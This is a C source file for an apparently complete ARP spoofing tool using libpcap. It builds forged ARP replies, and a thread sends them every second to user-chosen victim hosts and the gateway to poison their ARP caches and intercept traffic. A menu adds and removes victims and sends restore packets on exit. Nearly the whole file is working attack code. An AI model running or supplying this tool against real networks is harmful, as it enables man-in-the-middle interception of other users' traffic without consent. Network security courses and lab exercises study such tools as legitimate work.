#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <netinet/in.h>
#include <pcap.h>
#include <pthread.h>
#include <unistd.h>
#include <linux/if_ether.h>
#include "InitPcap.h"
#include "GetNetworkInfo.h"
#include "AttackInfo.h"

extern BYTE gLocalMAC[6];
extern BYTE gGatewayIP[4];
extern BYTE gGatewayMAC[6];
extern BYTE gLocalIP[4];

void MakeARPReplyPacket(BYTE* localMac, BYTE* victimMac, BYTE* arpSrcMAC, BYTE* gatewayIP, BYTE* victimIP, BYTE* arpReplyPacket)
{
    int i = 0;
    int packetIdx = 0;

    // set ethernet header
    for (i = 0; i < 6; i++) arpReplyPacket[packetIdx++] = victimMac[i];
    for (i = 0; i < 6; i++) arpReplyPacket[packetIdx++] = localMac[i];
    arpReplyPacket[packetIdx++] = 0x08; // type : ARP
    arpReplyPacket[packetIdx++] = 0x06;

    // set ARP header
    arpReplyPacket[packetIdx++] = 0x00; // Hardware Type : Ethernet
    arpReplyPacket[packetIdx++] = 0x01;
    arpReplyPacket[packetIdx++] = 0x08; // Protocol Type : IPv4
    arpReplyPacket[packetIdx++] = 0x00;
    arpReplyPacket[packetIdx++] = 0x06; // Hardware Size : 6
    arpReplyPacket[packetIdx++] = 0x04; // Protocol Size : 4
    arpReplyPacket[packetIdx++] = 0x00; // Opcode : Reply
    arpReplyPacket[packetIdx++] = 0x02;
    for (i = 0; i < 6; i++) arpReplyPacket[packetIdx++] = arpSrcMAC[i];
    for (i = 0; i < 4; i++) arpReplyPacket[packetIdx++] = gatewayIP[i];
    for (i = 0; i < 6; i++) arpReplyPacket[packetIdx++] = victimMac[i];
    for (i = 0; i < 4; i++) arpReplyPacket[packetIdx++] = victimIP[i];
}

static void *ArpSenderThread(void *arg)
{
    pcap_t** handle = arg;
    BYTE arpReplyPacket[42];
    int i = 0;

    while (1)
    {
        for (i = 0; i < ATTACK_TABLE_MAX; i++)
        {
            if (gAttackInfoArr[i].set == 1)
            {
                // arp response to sender
                MakeARPReplyPacket(gLocalMAC, gAttackInfoArr[i].mac, gLocalMAC, gGatewayIP, gAttackInfoArr[i].ip, arpReplyPacket);
                pcap_sendpacket(*handle, arpReplyPacket, 42);
                // arp response to receiver
                MakeARPReplyPacket(gLocalMAC, gGatewayMAC, gLocalMAC, gAttackInfoArr[i].ip, gGatewayIP, arpReplyPacket);
                pcap_sendpacket(*handle, arpReplyPacket, 42);
            }
        }

        sleep(1);
    }

    return 0;
}

void EndARPSpoof(pcap_t* handle, int userIdx)
{
    BYTE victimIP[4];
    BYTE victimMAC[6];
    BYTE arpReplyPacket[42];

    if (GetAttackInfo(userIdx, victimIP, victimMAC) == 0)
    {
        PrintMAC("restore ", victimMAC, "\n");
        DeleteAttackInfo(userIdx);
        sleep(2);

        MakeARPReplyPacket(gLocalMAC, victimMAC, gGatewayMAC, gGatewayIP, victimIP, arpReplyPacket);
        pcap_sendpacket(handle, arpReplyPacket, 42);
        MakeARPReplyPacket(gLocalMAC, gGatewayMAC, victimMAC, victimIP, gGatewayIP, arpReplyPacket);
        pcap_sendpacket(handle, arpReplyPacket, 42);
    }
}

int main(int argc, char** argv)
{
    pcap_t* handle;
    BYTE localMac[6] = {0,};
    BYTE victimMac[6] = {0,};
    BYTE victimIP[4];
    char userInput[20];

    printf("[*] Get default network information\n");

    if (GetLocalIPAddress(gLocalIP) == 0)
    {
        PrintIP("local IP address - ", gLocalIP, "\n");
    }
    else
    {
        printf("Get local IP adress fail\n");
        exit(-1);
    }

    if (GetLocalMacAddress(gLocalMAC))
    {
        PrintMAC("local MAC address - ", gLocalMAC, "\n");
    }
    else
    {
        printf("Get local MAC address fail\n");
        exit(-1);
    }

    if (GetGatewayIP(gGatewayIP))
    {
        PrintIP("gateway IP - ", gGatewayIP, "\n");
    }
    else
    {
        printf("Get gateway IP fail\n");
        exit(-1);
    }

    if (GetMacAddressFromByte(gGatewayIP, gGatewayMAC))
    {
        PrintMAC("gateway MAC - ", gGatewayMAC, "\n");
    }
    else
    {
        printf("get mac address fail\n");
        exit(-1);
    }

    if (InitPcap(&handle) == 0)
    {
        pthread_t threadId;
        pthread_attr_t attr;

	printf("[*] pcap thread execute success\n");

        if (pthread_attr_init(&attr) == 0 &&
            pthread_create(&threadId, &attr, &ArpSenderThread, &handle) == 0)
        {
            printf("[*] arp sender thread execute success\n");
        }
        else
        {
            // attr close;
            printf("arp sender thread execute fail\n");
            exit(-1);
        }


        while (1)
        {
            printf("1. add victim\n");
            printf("2. del victim\n");
            printf("3. exit\n");
            fgets(userInput, 20, stdin);

            if (userInput[0] == '1')
            {
                printf("input IP\n>>");
                fgets(userInput, 20, stdin);
                userInput[strlen(userInput) - 1] = '\0';

                if (!ConvertAddrToByteIP(userInput, victimIP))
                {
                    printf("invalid IP\n");
                    continue;
                }

                if (GetMacAddress(userInput, victimMac))
                {
                    PrintMAC("[*] victim MAC - ", victimMac, "\n");
                }
                else
                {
                    printf("Get victim MAC address fail : Invalid IP address\n");
                    continue;
                }

                if (InsertAttackInfo(victimIP, victimMac))
                {
                    printf("ARP spoofing start to %s\n", userInput);
                }
            }
            else if (userInput[0] == '2') // send arp restore packet
            {
                PrintAttackInfo();
                printf("select number\n>>");
                fgets(userInput, 20, stdin);
                int num = atoi(userInput);
                EndARPSpoof(handle, num);
            }
            else if (userInput[0] == '3')
            {
                printf("[*] restore infected arp table\n");
                int i = 0;
                for (; i < ATTACK_TABLE_MAX; i++)
                {
                    EndARPSpoof(handle, 1);
                }
                break;
            }
        }
    }

    return 0;
}
